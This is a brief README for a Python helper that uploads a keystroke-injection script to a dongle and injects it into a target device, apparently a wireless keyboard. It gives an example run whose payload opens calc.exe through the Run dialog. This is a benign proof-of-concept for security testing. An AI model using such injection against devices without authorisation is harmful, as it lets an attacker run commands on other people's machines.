# Script Injection helper in Python

This helpers can be used to upload a script file to dongle's memory and directly start the injection as follows:

```
python script_inject.py -s /tmp/scripttest -i /dev/ttyACM1 -t "DD:47:xx:xx:xx"             
[+] Uploaded script:
script start
0001: press GUI r
0002: delay 20
0003: string calc.exe
0004: delay 20
0005: press ENTER
script end

[+] Injecting payload to DD:47:xx:xx:xx
```
